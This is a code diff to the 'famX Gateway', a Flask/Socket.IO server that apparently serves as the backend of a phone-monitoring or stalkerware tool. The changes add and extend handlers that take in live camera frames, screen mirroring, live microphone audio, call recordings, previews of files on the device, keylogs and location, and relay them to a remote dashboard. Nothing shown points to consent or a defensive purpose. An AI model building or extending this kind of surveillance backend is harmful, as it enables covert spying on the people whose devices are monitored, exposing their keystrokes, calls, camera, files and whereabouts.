@@ -5,7 +5,9 @@ from config import SECRET_KEY, DEVICE_PORT, HOST
 from extensions import socketio, gateway_socketio
 from core.database import (
     database, users_database, connected_devices, sid_to_device,
-    connected_device_licenses, save_db, save_users_db
+    connected_device_licenses, save_db, save_users_db,
+    set_device_online, set_device_offline, is_device_online,
+    get_device_sid, cache_telemetry, get_cached_telemetry
 )
 from core.parsers import update_device_record
 from core.gateway_auth import famx_token_or_license_required, verify_famx_token, generate_famx_token
@@ -61,11 +63,11 @@ def create_gateway_app():
     @famx_token_or_license_required
     def gateway_upload_media(device_id):
         """High-throughput hardware media & telemetry file upload handler."""
-        if 'file' not in request.files:
-            return jsonify({"success": False, "error": "No file part"}), 400
-        file = request.files['file']
+        file = request.files.get('file') or request.files.get('audio') or request.files.get('media')
+        if not file and request.files:
+            file = next(iter(request.files.values()))
         category = request.form.get('category', '').strip().lower()
-        if file.filename == '':
+        if not file or not file.filename:
             return jsonify({"success": False, "error": "No selected file"}), 400
             
         os.makedirs(os.path.join("data", device_id), exist_ok=True)
@@ -107,7 +109,24 @@ def create_gateway_app():
             print(f"[famX Gateway] Uploaded {category}.txt for device: {device_id}")
             return jsonify({"success": True})
 
-        # 1. Screen Mirroring Frame
+        # 1. Live Camera Frame (Strict priority to avoid filename conflicts)
+        elif category in ["live_camera", "camera_live"]:
+            cam_path = os.path.join("media", device_id, "live_camera.jpg")
+            file.save(cam_path)
+
+            cam_url = f"/api/media/stream/{device_id}/live_camera.jpg?t={now_ms}"
+            database[device_id]["live_camera_url"] = cam_url
+            database[device_id]["live_camera_time"] = now_ms
+            save_db(device_id)
+            cache_telemetry(f"device:{device_id}:live_camera_url", cam_url)
+            cache_telemetry(f"device:{device_id}:live_camera_time", str(now_ms))
+
+            socketio.emit('live_camera_update', {'device_id': device_id, 'url': cam_url}, room=device_id)
+            socketio.emit('live_camera_update', {'device_id': device_id, 'url': cam_url})
+            print(f"[famX Gateway] Live Camera frame updated for device: {device_id}")
+            return jsonify({"success": True, "url": cam_url})
+
+        # 2. Screen Mirroring Frame
         elif category in ["mirror", "screen", "live_screen"] or any(k in fn_lower for k in ["mirror", "mirro", "mirrro"]):
             mirror_path = os.path.join("media", device_id, "mirror.jpg")
             file.save(mirror_path)
@@ -115,22 +134,24 @@ def create_gateway_app():
             mirror_url = f"/api/media/stream/{device_id}/mirror.jpg?t={now_ms}"
             database[device_id]["mirror_url"] = mirror_url
             database[device_id]["mirror_time"] = now_ms
-            save_db()
+            save_db(device_id)
+            cache_telemetry(f"device:{device_id}:mirror_url", mirror_url)
+            cache_telemetry(f"device:{device_id}:mirror_time", str(now_ms))
 
             socketio.emit('mirror_update', {'device_id': device_id, 'url': mirror_url}, room=device_id)
             socketio.emit('mirror_update', {'device_id': device_id, 'url': mirror_url})
             print(f"[famX Gateway] Live Mirror frame updated for device: {device_id}")
             return jsonify({"success": True, "url": mirror_url})
 
-        # 2. Live Camera Frame
-        elif category in ["live_camera", "camera_live"] or any(k in fn_lower for k in ["live_camera", "livecam", "live_cam"]):
+        # 3. Fallback Live Camera by filename
+        elif any(k in fn_lower for k in ["live_camera", "livecam", "live_cam"]):
             cam_path = os.path.join("media", device_id, "live_camera.jpg")
             file.save(cam_path)
 
             cam_url = f"/api/media/stream/{device_id}/live_camera.jpg?t={now_ms}"
             database[device_id]["live_camera_url"] = cam_url
             database[device_id]["live_camera_time"] = now_ms
-            save_db()
+            save_db(device_id)
 
             socketio.emit('live_camera_update', {'device_id': device_id, 'url': cam_url}, room=device_id)
             socketio.emit('live_camera_update', {'device_id': device_id, 'url': cam_url})
@@ -144,14 +165,14 @@ def create_gateway_app():
 
             wp_url = f"/api/media/stream/{device_id}/wallpaper.jpg?t={now_ms}"
             database[device_id]["wallpaper_url"] = wp_url
-            save_db()
+            save_db(device_id)
 
             socketio.emit('wallpaper_update', {'device_id': device_id, 'url': wp_url}, room=device_id)
             socketio.emit('wallpaper_update', {'device_id': device_id, 'url': wp_url})
             return jsonify({"success": True})
 
         # 4. Audio / Voice Recordings / Live Audio Chunks
-        elif category in ["audio", "voice", "recording", "recordings", "live_audio"] or fn_lower.startswith("audio_") or fn_lower.endswith(('.mp3', '.m4a', '.wav', '.ogg', '.aac')):
+        elif category in ["audio", "voice", "recording", "recordings", "live_audio"] or fn_lower.startswith("audio_") or fn_lower.endswith(('.mp3', '.m4a', '.wav', '.ogg', '.aac', '.3gp', '.amr', '.opus', '.webm')):
             voice_dir = os.path.join("media", device_id, "voice")
             os.makedirs(voice_dir, exist_ok=True)
             voice_file_path = os.path.join(voice_dir, filename)
@@ -170,6 +191,14 @@ def create_gateway_app():
             chunk_url = f"/api/media/stream/{device_id}/{filename}"
             database[device_id]["live_audio_url"] = chunk_url
             database[device_id]["live_audio_time"] = now_ms
+            cache_telemetry(f"device:{device_id}:live_audio_url", chunk_url)
+            cache_telemetry(f"device:{device_id}:live_audio_time", str(now_ms))
+
+            dur_sec = 15
+            if "30" in fn_lower: dur_sec = 30
+            elif "60" in fn_lower or "1min" in fn_lower: dur_sec = 60
+            elif "300" in fn_lower or "5min" in fn_lower: dur_sec = 300
+            elif "600" in fn_lower or "10min" in fn_lower: dur_sec = 600
 
             media_type = "call_recording" if ("call" in fn_lower or "call" in category) else "audio"
             fb_key = f"m_{now_ms}_{filename.split('.')[0]}"
@@ -179,39 +208,44 @@ def create_gateway_app():
                 "name": filename,
                 "type": media_type,
                 "bytes": file_size,
-                "duration": 15
+                "duration": dur_sec
             }
-            save_db()
+            save_db(device_id)
 
             socketio.emit('live_audio_chunk', {'device_id': device_id, 'url': chunk_url}, room=device_id)
             socketio.emit('live_audio_chunk', {'device_id': device_id, 'url': chunk_url})
-            print(f"[famX Gateway] Uploaded audio {filename} ({media_type}) for device: {device_id}")
-            return jsonify({"success": True})
+            socketio.emit('media_update', {'device_id': device_id, 'media': database[device_id]['media']})
+            print(f"[famX Gateway] Uploaded audio {filename} ({media_type}, {dur_sec}s) for device: {device_id}")
+            return jsonify({"success": True, "url": chunk_url})
 
-        # 5. Photos / Camera Captures / Screenshots
+        # 5. File Manager Image & Video Previews
+        elif category in ["previews", "preview"]:
+            file_path = os.path.join("media", device_id, filename)
+            file.save(file_path)
+
+            path_on_device = request.form.get('path', '')
+            fb_key = f"p_{now_ms}"
+            preview_entry = {
+                "time": now_ms,
+                "url": f"/api/media/stream/{device_id}/{filename}",
+                "name": filename,
+                "path": path_on_device
+            }
+            if device_id not in database:
+                database[device_id] = {"_id": device_id}
+            if "previews" not in database[device_id] or not isinstance(database[device_id]["previews"], dict):
+                database[device_id]["previews"] = {}
+            database[device_id]["previews"][fb_key] = preview_entry
+            database[device_id]["lastSeen"] = now_ms
+            save_db(device_id)
+
+            socketio.emit('preview_ready', {'device_id': device_id, 'preview': preview_entry}, room=device_id)
+            socketio.emit('preview_ready', {'device_id': device_id, 'preview': preview_entry})
+            print(f"[famX Gateway] Uploaded preview {filename} (path: {path_on_device}) for device: {device_id}")
+            return jsonify({"success": True, "url": preview_entry["url"]})
+
+        # 6. Photos / Camera Captures / Screenshots
         elif category in ["photo", "photos", "camera", "image", "screenshot", "screenshots", "screencap"] or fn_lower.startswith(("img_", "screenshot", "cam_")):
-            # Absolute guard: If incoming file is a mirror or live_camera frame, divert immediately
-            if any(k in fn_lower for k in ["mirror", "mirro", "mirrro"]):
-                mirror_path = os.path.join("media", device_id, "mirror.jpg")
-                file.save(mirror_path)
-                mirror_url = f"/api/media/stream/{device_id}/mirror.jpg?t={now_ms}"
-                database[device_id]["mirror_url"] = mirror_url
-                database[device_id]["mirror_time"] = now_ms
-                save_db()
-                socketio.emit('mirror_update', {'device_id': device_id, 'url': mirror_url}, room=device_id)
-                socketio.emit('mirror_update', {'device_id': device_id, 'url': mirror_url})
-                return jsonify({"success": True, "url": mirror_url})
-
-            if any(k in fn_lower for k in ["live_camera", "livecam", "live_cam"]):
-                cam_path = os.path.join("media", device_id, "live_camera.jpg")
-                file.save(cam_path)
-                cam_url = f"/api/media/stream/{device_id}/live_camera.jpg?t={now_ms}"
-                database[device_id]["live_camera_url"] = cam_url
-                database[device_id]["live_camera_time"] = now_ms
-                save_db()
-                socketio.emit('live_camera_update', {'device_id': device_id, 'url': cam_url}, room=device_id)
-                socketio.emit('live_camera_update', {'device_id': device_id, 'url': cam_url})
-                return jsonify({"success": True, "url": cam_url})
 
             photos_dir = os.path.join("media", device_id, "photos")
             os.makedirs(photos_dir, exist_ok=True)
@@ -239,7 +273,7 @@ def create_gateway_app():
                 "type": media_type,
                 "bytes": file_size
             }
-            save_db()
+            save_db(device_id)
             print(f"[famX Gateway] Uploaded photo {filename} ({media_type}) for device: {device_id}")
             return jsonify({"success": True})
 
@@ -297,12 +331,10 @@ def _register_gateway_socket_events(sio):
 
         from flask_socketio import join_room
         join_room(device_id)
-        connected_devices[device_id] = request.sid
-        sid_to_device[request.sid] = device_id
+        set_device_online(device_id, request.sid, license_key)
         
         if license_key:
             license_key = license_key.strip()
-            connected_device_licenses[device_id] = license_key
             if device_id not in database:
                 database[device_id] = {"_id": device_id}
             database[device_id]["license_key"] = license_key
@@ -339,10 +371,8 @@ def _register_gateway_socket_events(sio):
 
     @sio.on('disconnect')
     def handle_device_disconnect():
-        device_id = sid_to_device.pop(request.sid, None)
+        device_id = set_device_offline(request.sid)
         if device_id:
-            connected_devices.pop(device_id, None)
-            connected_device_licenses.pop(device_id, None)
             print(f"[famX Gateway] Device disconnected: {device_id}")
             update_device_record(device_id, "logs", "Device Disconnected")
             sio.emit('device_status_change', {'device_id': device_id, 'online': False})
@@ -354,6 +384,23 @@ def _register_gateway_socket_events(sio):
         if device_id:
             # Relay camera frame live to Web Dashboard listeners on Port 8800!
             socketio.emit('camera_frame_relay', data, room=device_id)
+
+    @sio.on('screen_frame')
+    @sio.on('mirror_frame')
+    def handle_screen_frame(data):
+        device_id = sid_to_device.get(request.sid)
+        if device_id:
+            # Relay mirror frame live to Web Dashboard listeners on Port 8800!
+            socketio.emit('mirror_frame_relay', data, room=device_id)
+            socketio.emit('mirror_frame_relay', data)
+
+    @sio.on('audio_frame')
+    def handle_audio_frame(data):
+        device_id = sid_to_device.get(request.sid)
+        if device_id:
+            # Relay audio frame live to Web Dashboard listeners on Port 8800!
+            socketio.emit('live_audio_relay', data, room=device_id)
+            socketio.emit('live_audio_relay', data)
 
     @sio.on('keylogs')
     def handle_keylogs(data):
@@ -434,6 +481,7 @@ def _register_gateway_socket_events(sio):
                     save_db()
 
             update_device_record(device_id, "location", data)
+            cache_telemetry(f"device:{device_id}:location", data)
             check_geofences_for_device(socketio, device_id, data)
             
             # Relay location live to Web Dashboard
